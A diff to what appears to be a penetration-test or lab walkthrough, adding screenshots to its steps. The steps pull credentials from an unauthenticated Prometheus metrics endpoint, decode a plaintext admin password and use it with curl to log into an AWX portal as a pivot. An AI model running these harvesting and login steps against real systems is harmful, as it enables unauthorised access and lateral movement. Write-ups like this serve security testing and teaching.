@@ -20,10 +20,15 @@ curl -s http://203.x.x.x:9090/metrics | head -5
 # Returns Prometheus-format text with no authentication prompt
 ```
 
+<img width="1652" height="1187" alt="image" src="https://github.com/user-attachments/assets/3f95b9d4-6e1f-403a-8ed8-a39fc01a13d4" />
+
+
 ### Step 2 — Extract Credential Labels
 ```bash
 curl -s http://203.x.x.x:9090/metrics | grep "pul_scrape_target_url"
 ```
+
+<img width="1652" height="1187" alt="image" src="https://github.com/user-attachments/assets/9334174f-95b4-4f7d-8981-65fc550b80dd" />
 
 **Output:**
 ```
@@ -36,12 +41,17 @@ python3 -c "import urllib.parse; print(urllib.parse.unquote('devops-admin:DevOps
 # Output: devops-admin:DevOps@PUL!24
 ```
 
+<img width="1339" height="164" alt="image" src="https://github.com/user-attachments/assets/34af965a-08b5-4f46-bf0b-ded481f17c92" />
+
+
 ### Step 4 — Login to AWX Portal
 ```bash
 curl -s -c /tmp/awx_cookies.txt -X POST http://203.x.x.x:8080/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=devops-admin&password=DevOps%40PUL%2124" -L
 ```
+<img width="2008" height="914" alt="image" src="https://github.com/user-attachments/assets/5cea20fe-5d49-42e9-bad2-f9297b96e03d" />
+
 
 **Pivot Credential:** `devops-admin : DevOps@PUL!24` → M5 `203.x.x.x:8080`
 
